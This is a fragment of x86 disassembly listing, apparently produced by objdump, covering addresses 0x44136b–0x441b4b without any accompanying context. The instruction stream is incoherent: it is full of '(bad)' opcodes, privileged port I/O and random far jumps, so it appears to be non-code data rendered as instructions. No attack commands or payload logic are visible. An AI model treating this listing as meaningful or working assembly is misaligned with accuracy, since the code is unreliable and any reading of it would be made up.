  44136b:	jmp    0x28b1540a
  441370:	sbb    edi,ecx
  441372:	fdiv   st(4),st
  441374:	jnp    0x441352
  441376:	push   0xffffffdf
  441378:	jle    0x441315
  44137a:	jmp    0x4413c7
  44137c:	sbb    DWORD PTR [esi+0x54],ebp
  44137f:	mov    bl,0x66
  441381:	cmp    al,cl
  441383:	add    cl,dh
  441385:	add    cl,ch
  441387:	(bad)  
  441388:	cli    
  441389:	sub    BYTE PTR [edi+0x5b],ah
  44138c:	xchg   esp,eax
  44138d:	fwait
  44138e:	jmp    0x441333
  441390:	mov    ebx,0x53488b1d
  441395:	(bad)  
  441396:	cli    
  441397:	fld    st(7)
  441399:	(bad)  
  44139a:	mov    dh,0x14
  44139c:	cdq    
  44139d:	pop    ebp
  44139e:	pop    esp
  44139f:	clc    
  4413a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4413a1:	popf   
  4413a2:	sub    esi,ebp
  4413a4:	rol    BYTE PTR [ecx+0x20],cl
  4413a7:	fadd   QWORD PTR [ecx]
  4413a9:	ficom  DWORD PTR [eax+0x31a46ea0]
  4413af:	addr16 jmp 0x5b38:0x7655d634
  4413b7:	popa   
  4413b8:	retf   0x87a7
  4413bb:	push   esp
  4413bc:	adc    BYTE PTR [ebx-0x6c6bdfde],bl
  4413c2:	out    0x24,al
  4413c4:	leave  
  4413c5:	sbb    ch,BYTE PTR [ebx+0x1ba041be]
  4413cb:	add    ch,BYTE PTR [edx+ebp*2+0x59]
  4413cf:	int3   
  4413d0:	jge    0x441441
  4413d2:	nop
  4413d3:	mov    esp,0x44b70528
  4413d8:	and    edi,DWORD PTR ss:[edx+0x3189c516]
  4413df:	icebp  
  4413e0:	sub    DWORD PTR [ebx],edx
  4413e2:	test   al,0x3e
  4413e4:	xchg   BYTE PTR [ecx+0x1],bl
  4413e7:	inc    edx
  4413e8:	repnz xchg edi,eax
  4413ea:	inc    esi
  4413eb:	or     DWORD PTR ds:0xd655bb06,eax
  4413f1:	add    eax,0xa3d53af8
  4413f6:	sub    ebx,DWORD PTR [edx]
  4413f8:	icebp  
  4413f9:	cmc    
  4413fa:	xor    BYTE PTR [esi+0x1eea8a09],ch
  441400:	adc    al,0x9d
  441402:	xchg   ebp,eax
  441403:	lds    ecx,FWORD PTR [esi-0x4a64b719]
  441409:	mov    dh,0x70
  44140b:	stc    
  44140c:	jae    0x44140f
  44140e:	test   BYTE PTR [esi],bh
  441410:	xchg   ebx,eax
  441411:	in     eax,dx
  441412:	push   DWORD PTR [eax-0x2a]
  441415:	xchg   esp,eax
  441416:	ja     0x44146e
  441418:	sbb    al,0xe6
  44141a:	mov    edx,0x3ba8783c
  44141f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441420:	mov    edx,0xf37a9000
  441425:	fistp  DWORD PTR [ebx-0x7c]
  441428:	(bad)  
  441429:	clc    
  44142a:	mov    esi,0xc3f48974
  44142f:	inc    esi
  441430:	inc    esi
  441431:	mov    edi,0x9b5f59d6
  441436:	xchg   esi,eax
  441437:	cmp    edx,eax
  441439:	and    BYTE PTR fs:[edx+eiz*1],al
  44143d:	pop    ecx
  44143e:	push   ebp
  44143f:	push   esp
  441440:	sets   BYTE PTR [esi+0x2d]
  441444:	mov    ebx,0xf52f1332
  441449:	popf   
  44144a:	cmp    al,0xf3
  44144c:	cmp    cl,dl
  44144e:	sub    ah,ah
  441450:	and    DWORD PTR [ecx-0x65],edi
  441453:	ficom  DWORD PTR [esi+0x41]
  441456:	retf   0x5892
  441459:	pop    ebx
  44145a:	lea    esi,[edi+0x1b]
  44145d:	jne    0x44144c
  44145f:	push   ds
  441460:	cmc    
  441461:	adc    eax,0x200fe92d
  441466:	mov    dh,BYTE PTR cs:[edx]
  441469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44146a:	mov    dl,0x74
  44146c:	jnp    0x441400
  44146e:	xchg   ecx,eax
  44146f:	or     DWORD PTR ds:0x47ea692d,eax
  441475:	xor    DWORD PTR [ecx-0x76b6deaa],esi
  44147b:	out    dx,al
  44147c:	cmp    bh,ch
  44147e:	fadd   QWORD PTR [eax+0x7d]
  441481:	sahf   
  441482:	sub    esi,ecx
  441484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441485:	pop    ecx
  441486:	inc    eax
  441487:	sub    BYTE PTR [ebx-0x2a],bl
  44148a:	mov    cl,0x7a
  44148c:	out    0x64,eax
  44148e:	mov    ebx,0xe0238764
  441493:	jl     0x44142a
  441495:	stos   DWORD PTR es:[edi],eax
  441496:	sbb    al,0xf0
  441498:	push   eax
  441499:	jns    0x441480
  44149b:	cmp    BYTE PTR ds:0x79b9ded9,bl
  4414a1:	enter  0x3d02,0x72
  4414a5:	test   al,0xbb
  4414a7:	mov    eax,ds:0xba01cb2a
  4414ac:	shl    DWORD PTR [esp+eax*1+0x7f],1
  4414b0:	push   esi
  4414b1:	mov    ds:0xcb6a8873,eax
  4414b6:	xchg   BYTE PTR [edx+0x11ca37bf],cl
  4414bc:	lahf   
  4414bd:	mov    edi,DWORD PTR [ebx+esi*2]
  4414c0:	adc    eax,edx
  4414c2:	xchg   ecx,eax
  4414c3:	stos   DWORD PTR es:[edi],eax
  4414c4:	xor    al,0x12
  4414c6:	mov    bl,0xb6
  4414c8:	and    ecx,ecx
  4414ca:	aam    0x4a
  4414cc:	lds    edx,FWORD PTR [eax]
  4414ce:	icebp  
  4414cf:	xchg   eax,edi
  4414d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4414d2:	stos   DWORD PTR es:[edi],eax
  4414d3:	mov    ch,0xac
  4414d5:	mov    eax,0xc473f4a8
  4414da:	xor    dh,bl
  4414dc:	xchg   cl,ah
  4414de:	mov    ecx,0xde24d424
  4414e3:	mul    BYTE PTR [ebp+0x4e]
  4414e6:	push   edx
  4414e7:	out    0x2,al
  4414e9:	sbb    ebp,DWORD PTR [edi+0x359249f]
  4414ef:	or     edi,esi
  4414f1:	imul   edi,ebx,0xfb9a5b57
  4414f7:	pushf  
  4414f8:	jle    0x441523
  4414fa:	mov    edi,edi
  4414fc:	cmp    BYTE PTR [ecx],bl
  4414fe:	sub    eax,0x839e4165
  441503:	mov    BYTE PTR [ebx],ch
  441505:	fbld   TBYTE PTR [esi]
  441507:	jno    0x441584
  441509:	ror    BYTE PTR [ebx-0x5d],1
  44150c:	loop   0x4414c7
  44150e:	mov    gs,WORD PTR [ebp+ebx*1-0x1f]
  441512:	sbb    bl,bl
  441514:	and    edi,DWORD PTR [ecx+0x19bf8593]
  44151a:	or     esp,DWORD PTR [esi+0x71]
  44151d:	enter  0xaacb,0xa4
  441521:	lahf   
  441522:	xchg   esi,eax
  441523:	out    0x21,eax
  441525:	cmp    eax,0x2947428b
  44152a:	xor    DWORD PTR [eax],edi
  44152c:	or     al,BYTE PTR [ebx]
  44152e:	inc    ebx
  44152f:	mov    ds:0x7529b13f,al
  441534:	add    ch,BYTE PTR [edi-0x4d]
  441537:	sti    
  441538:	add    eax,0x89fd9eac
  44153d:	imul   ecx,ecx,0x70
  441540:	test   BYTE PTR [ebx+0x264732aa],al
  441546:	enter  0x3384,0x9e
  44154a:	inc    ebx
  44154b:	lahf   
  44154c:	sub    BYTE PTR [ebx-0x6216b843],dl
  441552:	sbb    ecx,DWORD PTR [ecx+0xcc674ea]
  441558:	sbb    ebp,DWORD PTR [ecx]
  44155a:	cmp    al,0x49
  44155c:	mov    esp,DWORD PTR [ebx+0x79]
  44155f:	sub    al,0x83
  441561:	sbb    ah,bl
  441563:	cdq    
  441564:	add    bl,BYTE PTR [eax-0x40]
  441567:	inc    edx
  441568:	mov    esp,DWORD PTR ds:0x5887d874
  44156e:	call   0x65ea4a72
  441573:	sub    al,0xa9
  441575:	mov    ds:0x7fd116a6,eax
  44157a:	out    0x50,eax
  44157c:	mov    ah,0x36
  44157e:	ret    
  44157f:	jae    0x441576
  441581:	shr    ebx,1
  441583:	icebp  
  441584:	xchg   ecx,eax
  441585:	test   al,0xbf
  441587:	sbb    ah,BYTE PTR [ecx+0x29]
  44158a:	test   BYTE PTR [edi+esi*1],ch
  44158d:	fcmovne st,st(2)
  44158f:	mov    esp,0x30b4d49b
  441594:	test   ecx,ebp
  441596:	je     0x44157d
  441598:	adc    al,0x94
  44159a:	inc    ecx
  44159b:	sbb    esp,ecx
  44159d:	sbb    ch,ch
  44159f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4415a0:	pop    ds
  4415a1:	sub    eax,0xa643c4fc
  4415a6:	cmp    DWORD PTR [edx-0x29],ebx
  4415a9:	scas   eax,DWORD PTR es:[edi]
  4415aa:	pop    esp
  4415ab:	stos   DWORD PTR es:[edi],eax
  4415ac:	sahf   
  4415ad:	pop    esp
  4415ae:	mov    WORD PTR [esi+0x7],ds
  4415b1:	or     ebx,DWORD PTR [edi-0x4f5dc3e1]
  4415b7:	adc    bh,BYTE PTR [esi+0x6a34b26c]
  4415bd:	ret    
  4415be:	sub    ah,BYTE PTR [di-0x1fd1]
  4415c3:	out    0xf5,al
  4415c5:	or     DWORD PTR [ecx+0x32491bf5],edi
  4415cb:	sbb    ebp,DWORD PTR [edi]
  4415cd:	push   ebx
  4415ce:	adc    al,0x4
  4415d0:	test   BYTE PTR [esi-0x6b8837e5],al
  4415d6:	cmc    
  4415d7:	rol    DWORD PTR [edx],0xd4
  4415da:	push   edx
  4415db:	popa   
  4415dc:	pop    ds
  4415dd:	mov    esi,0xbcabea9f
  4415e2:	addr16 mov ecx,0xe97ebaf0
  4415e8:	add    al,0xa3
  4415ea:	fwait
  4415eb:	shl    BYTE PTR [edx+edi*2],cl
  4415ee:	ret    0xcb82
  4415f1:	cmp    BYTE PTR ds:0xb7ea079b,0x62
  4415f8:	in     eax,0xa4
  4415fa:	dec    ecx
  4415fb:	cdq    
  4415fc:	jmp    0x441594
  4415fe:	and    eax,0xfa5b9641
  441603:	mov    WORD PTR [esp+eiz*4],ss
  441606:	jnp    0x441594
  441608:	ins    BYTE PTR es:[edi],dx
  441609:	div    esp
  44160b:	or     BYTE PTR [esi],bl
  44160d:	jmp    0x6f9beb35
  441612:	adc    esp,ebx
  441614:	dec    esp
  441615:	sahf   
  441616:	sub    ebp,edx
  441618:	or     edi,esp
  44161a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44161b:	bswap  edx
  44161d:	lds    esp,FWORD PTR [ebx]
  44161f:	mov    cl,0x65
  441621:	jnp    0x4415e2
  441623:	aam    0xc9
  441625:	mov    BYTE PTR ds:0x2bea37aa,bl
  44162b:	mov    ebx,0xeeb29019
  441630:	mov    bl,0x5b
  441632:	call   0xf74d36bc
  441637:	inc    edx
  441638:	leave  
  441639:	loopne 0x44164c
  44163b:	xor    eax,0xd55b9dee
  441640:	and    DWORD PTR [esp+edx*2+0x27],eax
  441644:	add    BYTE PTR [ecx-0x290a8520],dl
  44164a:	mov    esp,0x5b6dcbd4
  44164f:	mov    edi,0xf2ab0795
  441654:	aad    0xf0
  441656:	shl    DWORD PTR [esp],0x69
  44165a:	xlat   BYTE PTR ds:[ebx]
  44165c:	stos   BYTE PTR es:[edi],al
  44165d:	pop    edi
  44165e:	je     0x4416d3
  441660:	xor    BYTE PTR [edi-0x3d],bh
  441663:	loopne 0x44168a
  441665:	or     bh,cl
  441667:	out    0x99,al
  441669:	push   esi
  44166a:	pop    edi
  44166b:	xchg   BYTE PTR [ebx],bl
  44166d:	cdq    
  44166e:	(bad)  
  44166f:	mov    eax,ds:0xa1407af8
  441674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441675:	cdq    
  441676:	mov    esp,DWORD PTR [ecx+0x40e7da25]
  44167c:	inc    ebp
  44167d:	inc    edi
  44167e:	test   DWORD PTR ds:0x484b9e49,0xff9d7e34
  441688:	mov    BYTE PTR [ebx+ecx*8+0x6d9a42ad],ah
  44168f:	bound  ebx,QWORD PTR [edi]
  441691:	dec    edx
  441692:	shr    DWORD PTR [ecx],1
  441694:	xor    cl,0xb7
  441697:	and    al,0xef
  441699:	xor    dh,al
  44169b:	aaa    
  44169c:	gs (bad) 
  44169e:	call   0x10914c94
  4416a3:	rcr    BYTE PTR [ecx],0x29
  4416a6:	xor    DWORD PTR [edi-0x73],edx
  4416a9:	inc    ebp
  4416aa:	(bad)  
  4416ab:	jne    0x4416fb
  4416ad:	cwde   
  4416ae:	jmp    DWORD PTR [ebp+0x24]
  4416b1:	(bad)  
  4416b2:	and    esi,DWORD PTR [edx]
  4416b4:	inc    edi
  4416b5:	jne    0x44163d
  4416b7:	aad    0x25
  4416b9:	jne    0x441710
  4416bb:	hlt    
  4416bc:	mov    BYTE PTR [eiz*4+0x67b9f973],al
  4416c3:	lods   al,BYTE PTR ds:[esi]
  4416c4:	mov    bh,0xa4
  4416c6:	outs   dx,DWORD PTR ds:[esi]
  4416c7:	sbb    BYTE PTR [ebx],dh
  4416c9:	xor    DWORD PTR [edx+0x59ac15d0],edi
  4416cf:	call   0x98f95d99
  4416d4:	mov    esi,0x36caa16c
  4416d9:	and    DWORD PTR [ecx-0x2a60e0a1],esi
  4416df:	push   0xffffffa6
  4416e1:	inc    eax
  4416e2:	lahf   
  4416e3:	mov    DWORD PTR [esi+0x6b],esi
  4416e6:	shl    al,cl
  4416e8:	aad    0xd
  4416ea:	(bad)  
  4416eb:	repnz jecxz 0x441714
  4416ee:	xchg   BYTE PTR [edx-0x6b],ah
  4416f1:	pop    ebx
  4416f2:	dec    esi
  4416f3:	mov    ah,0x91
  4416f5:	xchg   DWORD PTR [ebx+0x4515a1d4],esi
  4416fb:	jno    0x441722
  4416fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4416fe:	and    esi,eax
  441700:	cvtpi2ps xmm6,QWORD PTR [esi+eax*1-0x186b660a]
  441708:	jmp    0x1c67:0x7a1599a5
  44170f:	inc    ecx
  441710:	cmc    
  441711:	cmc    
  441712:	mov    eax,ds:0xf1648ef3
  441717:	test   eax,0xcec6c8e5
  44171c:	sbb    BYTE PTR [edx+esi*4-0x1c],dh
  441720:	and    BYTE PTR [ecx],0xef
  441723:	scas   eax,DWORD PTR es:[edi]
  441724:	xchg   ah,ch
  441726:	scas   al,BYTE PTR es:[edi]
  441727:	inc    ebx
  441728:	inc    ecx
  441729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44172a:	aaa    
  44172b:	mov    ch,0xb3
  44172d:	adc    bl,BYTE PTR [ebx-0x12]
  441730:	jnp    0x44173e
  441732:	xchg   esi,eax
  441733:	es push edi
  441735:	lahf   
  441736:	mov    al,0x3c
  441738:	ret    
  441739:	pushf  
  44173a:	jmp    0x441796
  44173c:	test   ax,0xe196
  441740:	(bad)  
  441741:	jne    0x4416d6
  441743:	pusha  
  441744:	in     al,0x6b
  441746:	mov    al,0xd4
  441748:	inc    ebp
  441749:	mov    ecx,0x3867fba2
  44174e:	ds dec esi
  441750:	in     eax,0xdf
  441752:	in     al,0xed
  441754:	ins    DWORD PTR es:[edi],dx
  441755:	dec    ecx
  441756:	loope  0x4416f3
  441758:	sbb    BYTE PTR [edx-0x45],bh
  44175b:	in     al,0x7
  44175d:	les    ecx,FWORD PTR [edx+0x3ad18570]
  441763:	repnz loopne 0x44176b
  441766:	(bad)  [ecx-0x411de6e2]
  44176c:	dec    ecx
  44176d:	les    edi,FWORD PTR [ebp+0x7d20998e]
  441773:	pop    esp
  441774:	fimul  WORD PTR [eax+0x2a]
  441777:	repnz mov ds,WORD PTR [ecx]
  44177a:	rcr    BYTE PTR [ebp+0x5cfb76f0],0x54
  441781:	cdq    
  441782:	mov    al,0x9e
  441784:	pop    edx
  441785:	push   ss
  441786:	mov    ch,0xaa
  441788:	xor    DWORD PTR ss:[ecx+0x2552bca4],esi
  44178f:	aaa    
  441790:	sub    BYTE PTR [ecx-0x3368bbe9],bl
  441796:	(bad)  
  441797:	adc    bl,BYTE PTR [ebp+edx*8+0x4e071d14]
  44179e:	xlat   BYTE PTR ds:[ebx]
  44179f:	aam    0xed
  4417a1:	repnz ss in eax,dx
  4417a4:	inc    edx
  4417a5:	push   0xb25eeb9
  4417aa:	mov    eax,0xc07610d4
  4417af:	xor    DWORD PTR [esi],esp
  4417b1:	popa   
  4417b2:	or     BYTE PTR [ecx],ah
  4417b4:	sub    al,0x1b
  4417b6:	enter  0xccae,0x33
  4417ba:	xor    DWORD PTR [ebp-0x30],ecx
  4417bd:	loopne 0x441778
  4417bf:	aam    0x1d
  4417c1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4417c3:	mov    ebx,0xd1bc5dd7
  4417c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4417c9:	pushf  
  4417ca:	rcl    ecx,cl
  4417cc:	pop    ecx
  4417cd:	adc    BYTE PTR [edx],bl
  4417cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4417d0:	add    bh,BYTE PTR [ecx-0x21]
  4417d3:	and    al,0x5e
  4417d5:	popf   
  4417d6:	cdq    
  4417d7:	test   DWORD PTR [ebx+0x16],edx
  4417da:	add    al,0xeb
  4417dc:	dec    DWORD PTR [ebx-0x4d]
  4417df:	daa    
  4417e0:	jne    0x441770
  4417e2:	test   esp,esi
  4417e4:	pop    ebx
  4417e5:	xchg   ecx,eax
  4417e6:	scas   al,BYTE PTR es:[edi]
  4417e7:	fist   DWORD PTR [esi]
  4417e9:	and    al,0xe3
  4417eb:	stc    
  4417ec:	aaa    
  4417ed:	lods   eax,DWORD PTR ds:[esi]
  4417ee:	popf   
  4417ef:	xchg   esi,eax
  4417f0:	(bad)  
  4417f1:	jmp    0xcc2a:0xe24598b1
  4417f8:	mov    bh,ch
  4417fa:	and    eax,0xd8f476a7
  4417ff:	pop    ebx
  441800:	rcr    DWORD PTR [edi+0x35e9b8e0],cl
  441806:	dec    eax
  441807:	out    0x8f,eax
  441809:	and    eax,0x605954b7
  44180e:	or     al,0x59
  441810:	jne    0x441824
  441812:	loop   0x44180b
  441814:	mov    al,0x5a
  441816:	inc    edx
  441817:	and    al,0xb5
  441819:	cdq    
  44181a:	imul   eax,ebx,0x7d384922
  441820:	add    bl,BYTE PTR [edx+0x4b]
  441823:	cld    
  441824:	pusha  
  441825:	ret    0xe2bb
  441828:	or     ah,bh
  44182a:	pop    ebp
  44182b:	add    edi,ebp
  44182d:	enter  0x4b6f,0x1
  441831:	fild   WORD PTR [esi]
  441833:	out    dx,eax
  441834:	xchg   ebp,eax
  441835:	je     0x441894
  441837:	lock fcom QWORD PTR [ecx-0x41]
  44183b:	into   
  44183c:	bound  ecx,QWORD PTR [ecx-0x4947c6cb]
  441842:	sbb    esp,DWORD PTR [eax]
  441844:	stos   DWORD PTR es:[edi],eax
  441845:	and    eax,0xa431cccc
  44184a:	mov    ebx,0x9cba63e2
  44184f:	and    al,0x5c
  441851:	or     eax,DWORD PTR [esi-0x4762ec4e]
  441857:	push   esp
  441858:	add    al,0x4b
  44185a:	mov    edx,DWORD PTR [ecx-0x4cf75657]
  441860:	pusha  
  441861:	iret   
  441862:	mov    ch,0xec
  441864:	push   0xffffffb6
  441866:	ins    BYTE PTR es:[edi],dx
  441867:	js     0x441880
  441869:	mov    DWORD PTR [esp+ebp*2],esp
  44186c:	pushf  
  44186d:	dec    ebp
  44186e:	pop    es
  44186f:	dec    edx
  441870:	test   al,0xa2
  441872:	retf   
  441873:	add    al,0xa1
  441875:	inc    esi
  441876:	jl     0x441891
  441878:	jp     0x4418de
  44187a:	mov    edx,0xb4da0ffa
  44187f:	xor    al,0x31
  441881:	out    0x1c,al
  441883:	mov    dh,dh
  441885:	sbb    ebx,DWORD PTR [eax+0x5a]
  441888:	out    dx,al
  441889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44188a:	out    0x60,eax
  44188c:	pop    ebx
  44188d:	dec    edi
  44188e:	push   cs
  44188f:	mov    ah,0x0
  441891:	inc    edx
  441892:	mov    ecx,0x123c2e14
  441897:	jle    0x441821
  441899:	dec    ecx
  44189a:	adc    DWORD PTR ds:0xe2a5fc16,ebp
  4418a0:	mov    ecx,0x1770bc72
  4418a5:	or     DWORD PTR [edi+0x3fb8b5ef],edx
  4418ab:	mov    WORD PTR [ebp-0x43],gs
  4418ae:	inc    edx
  4418af:	pop    edi
  4418b0:	dec    edx
  4418b1:	cmc    
  4418b2:	dec    esp
  4418b3:	jae    0x441868
  4418b5:	test   BYTE PTR [esi*8-0x19a6b17b],ch
  4418bc:	fucomp st(2)
  4418be:	xchg   ecx,eax
  4418bf:	inc    edx
  4418c0:	jle    0x441941
  4418c2:	fdivr  QWORD PTR [esi-0x27]
  4418c5:	test   DWORD PTR [edi-0x445786ec],esi
  4418cb:	mov    DWORD PTR [ecx+0x71],esi
  4418ce:	daa    
  4418cf:	or     edi,DWORD PTR [edi+0x4bb4ad82]
  4418d5:	or     eax,0xb9c524b1
  4418da:	xchg   ebp,eax
  4418db:	sub    edx,ebx
  4418dd:	fisttp WORD PTR [edi+ebp*4+0x39]
  4418e1:	push   ebp
  4418e2:	mov    eax,0xdd2f04a4
  4418e7:	adc    DWORD PTR [ebp+0xa],ebx
  4418ea:	mov    edx,0x3eb0c404
  4418ef:	jecxz  0x4418a7
  4418f1:	in     eax,0x45
  4418f3:	pop    ecx
  4418f4:	push   edx
  4418f5:	mov    ds:0xa8913f23,eax
  4418fa:	jge    0x441886
  4418fc:	jl     0x4418eb
  4418fe:	mov    ebp,0x53e73e04
  441903:	sbb    DWORD PTR ds:0x1cf273a8,edx
  441909:	dec    esp
  44190a:	cdq    
  44190b:	dec    ebx
  44190c:	push   ds
  44190d:	jmp    0xbe2e0d65
  441912:	sahf   
  441913:	jmp    0x534fbe22
  441918:	ret    0xb1d
  44191b:	lods   al,BYTE PTR ds:[esi]
  44191c:	jmp    0x920efcc7
  441921:	and    eax,0x161ca52e
  441926:	or     eax,DWORD PTR [edx]
  441928:	fsub   QWORD PTR [ebx+0x30a72f3b]
  44192e:	add    cl,cl
  441930:	push   0x24eda9f3
  441935:	cmp    DWORD PTR [ebx],esp
  441937:	in     al,dx
  441938:	and    BYTE PTR [edx-0x4f9f20e6],dl
  44193e:	bound  esp,QWORD PTR [ecx+ecx*2]
  441941:	or     eax,0x3abc6ec6
  441946:	mov    ebx,0x362f6cc4
  44194b:	sahf   
  44194c:	mov    sp,0x14bc
  441950:	jae    0x441933
  441952:	pop    ds
  441953:	rcl    BYTE PTR [esi-0x6c1ce83a],1
  441959:	and    bh,BYTE PTR [bp+0x1a]
  44195d:	dec    edi
  44195e:	inc    ch
  441960:	out    dx,eax
  441961:	push   edi
  441962:	in     al,dx
  441963:	mov    ah,0x97
  441965:	inc    ebp
  441966:	clc    
  441967:	inc    esi
  441968:	adc    dl,0xbe
  44196b:	xor    al,0x12
  44196d:	mov    ds:0x1189559b,eax
  441972:	xchg   ebp,eax
  441973:	sub    al,0x32
  441975:	jmp    FWORD PTR [eax-0x26]
  441978:	aas    
  441979:	test   DWORD PTR es:[esi-0xad2727e],0xf1aff015
  441984:	jmp    0xe18e:0x76c2cba4
  44198b:	retf   0x21e5
  44198e:	mov    cl,0x92
  441990:	and    al,0x39
  441992:	and    ebx,DWORD PTR [ecx+edx*2]
  441995:	rcr    al,cl
  441997:	dec    ebx
  441998:	dec    esi
  441999:	test   al,0x3b
  44199b:	sub    BYTE PTR [ebx],al
  44199d:	loopne 0x4419b7
  44199f:	mov    ch,0xd6
  4419a1:	ficom  DWORD PTR [edi-0x2c]
  4419a4:	adc    al,0x7a
  4419a6:	add    esp,DWORD PTR ds:0x65dc2518
  4419ac:	jmp    0x381f054d
  4419b1:	push   esp
  4419b2:	or     BYTE PTR [esi+0x40],bh
  4419b5:	add    ebx,DWORD PTR [ebx+ecx*8]
  4419b8:	xor    al,0xf5
  4419ba:	loop   0x441a10
  4419bc:	aaa    
  4419bd:	sub    ebp,DWORD PTR [edx+0x3b]
  4419c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4419c1:	aaa    
  4419c2:	out    dx,eax
  4419c3:	pop    ebp
  4419c4:	mov    BYTE PTR gs:[eax+0x6927b9ee],ah
  4419cb:	xor    DWORD PTR [ecx],esp
  4419cd:	jmp    0x4e9ccb73
  4419d2:	test   DWORD PTR [edx+0x6f],esp
  4419d5:	call   0xec76:0x2700bd0b
  4419dc:	adc    BYTE PTR [ecx-0x25b5e0d7],bl
  4419e2:	mov    ah,0xf4
  4419e4:	inc    edx
  4419e5:	and    eax,0x9c757eaf
  4419ea:	jnp    0x441a54
  4419ec:	push   0x5143d4d2
  4419f1:	fmul   QWORD PTR [edx-0x4815a97e]
  4419f7:	add    al,0xa3
  4419f9:	enter  0x4dd8,0x65
  4419fd:	cwde   
  4419fe:	out    0xe4,al
  441a00:	std    
  441a01:	pop    ds
  441a02:	add    eax,0xb969162c
  441a07:	retf   
  441a08:	mov    bh,BYTE PTR [eax]
  441a0a:	rcr    DWORD PTR ss:[eax-0x1e75b465],1
  441a11:	pop    ebp
  441a12:	mov    eax,0x8bc39c65
  441a17:	dec    eax
  441a18:	int    0xfb
  441a1a:	xchg   ebp,eax
  441a1b:	gs and ebx,esi
  441a1e:	mov    ds:0x6bd275ee,eax
  441a23:	mov    cl,0x63
  441a25:	inc    ebp
  441a26:	sbb    eax,0x1df81a4e
  441a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441a2c:	aaa    
  441a2d:	cmp    esi,esi
  441a2f:	dec    edx
  441a30:	ja     0x4419cd
  441a32:	jae    0x441a30
  441a34:	push   ebx
  441a35:	xor    BYTE PTR [ecx-0x6],dl
  441a38:	dec    edi
  441a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441a3a:	jnp    0x4419c0
  441a3c:	add    al,0xb8
  441a3e:	add    al,dl
  441a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a41:	xchg   esi,eax
  441a42:	cmp    edi,DWORD PTR [edx+0x53]
  441a45:	popf   
  441a46:	mov    ch,0x94
  441a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441a49:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  441a4b:	popf   
  441a4c:	mov    ecx,0x7976360c
  441a51:	jb     0x441a5f
  441a53:	xchg   ebp,eax
  441a54:	add    eax,0x4fef5d07
  441a59:	jnp    0x441a83
  441a5b:	ja     0x4419df
  441a5d:	xchg   esp,eax
  441a5e:	mov    ebp,0x8449d4a4
  441a63:	std    
  441a64:	push   edi
  441a65:	call   0x922c:0x9264706
  441a6c:	cmc    
  441a6d:	adc    eax,0x7476f25d
  441a72:	xlat   BYTE PTR ds:[ebx]
  441a73:	std    
  441a74:	and    ah,bh
  441a76:	je     0x441acc
  441a78:	scas   eax,DWORD PTR es:[edi]
  441a79:	pushf  
  441a7a:	sub    eax,0xc3fe752c
  441a7f:	in     eax,dx
  441a80:	int    0xb1
  441a82:	sub    BYTE PTR [eax],dh
  441a84:	pusha  
  441a85:	retf   
  441a86:	xor    ebx,esi
  441a88:	(bad)  
  441a89:	jmp    0x18b5:0xfad98a50
  441a90:	push   ds
  441a91:	mov    di,0x257a
  441a95:	add    edx,edi
  441a97:	push   esi
  441a98:	jecxz  0x441ae1
  441a9a:	jae    0x441a25
  441a9c:	sbb    ecx,DWORD PTR [ecx-0x4fc425fa]
  441aa2:	mov    ch,0x8
  441aa4:	push   ebx
  441aa5:	mov    ds:0xe85140ab,al
  441aaa:	push   eax
  441aab:	mov    al,ds:0xa2e352ab
  441ab0:	popf   
  441ab1:	jge    0x441a6d
  441ab3:	pop    ebp
  441ab4:	fcomp  QWORD PTR [edi+ebx*1-0xd0e1815]
  441abb:	dec    edi
  441abc:	test   eax,0xde14b885
  441ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441ac2:	cmp    edx,DWORD PTR [edx+0x18]
  441ac5:	xchg   BYTE PTR [edx-0x28de005b],ah
  441acb:	cmp    BYTE PTR [ecx-0x2e],cl
  441ace:	sub    dl,BYTE PTR ds:0xc5dd3a1d
  441ad4:	aad    0xc3
  441ad6:	sti    
  441ad7:	loopne 0x441a81
  441ad9:	mov    ebp,esi
  441adb:	imul   esp,DWORD PTR [eax],0xf36a7785
  441ae1:	jo     0x441b5f
  441ae3:	icebp  
  441ae4:	or     ch,ah
  441ae6:	mov    ebx,0xc8b19e14
  441aeb:	or     eax,0x5fc34db6
  441af0:	xchg   edi,eax
  441af1:	inc    ebp
  441af2:	pusha  
  441af3:	and    DWORD PTR [esi-0x66e0bee1],edx
  441af9:	mov    ds:0x3921425a,al
  441afe:	cli    
  441aff:	xchg   edi,edx
  441b01:	dec    esi
  441b02:	test   eax,0x3bd0fb4e
  441b07:	adc    DWORD PTR [esi-0x69fe4d85],edx
  441b0d:	xor    eax,esp
  441b0f:	mov    ecx,0x141cc9a6
  441b14:	imul   ebp,eax,0x2b0505a2
  441b1a:	paddsb mm1,QWORD PTR [ecx-0x3a]
  441b1e:	pop    edi
  441b1f:	mov    bh,0x37
  441b21:	mov    dh,0x7d
  441b23:	add    eax,0xedaf9671
  441b28:	dec    esi
  441b29:	pop    ecx
  441b2a:	je     0x441ac8
  441b2c:	ror    BYTE PTR [esi+0x167e8fdd],0xbf
  441b33:	in     al,0x62
  441b35:	and    eax,0x4c558650
  441b3a:	mov    edi,0xea41d9e6
  441b3f:	out    0xea,eax
  441b41:	mov    dl,BYTE PTR [ecx]
  441b43:	stos   BYTE PTR es:[edi],al
  441b44:	sbb    BYTE PTR [ecx],cl
  441b46:	(bad)  
  441b47:	cmp    edx,DWORD PTR [eax]
  441b49:	dec    dx
  441b4b:	cld    
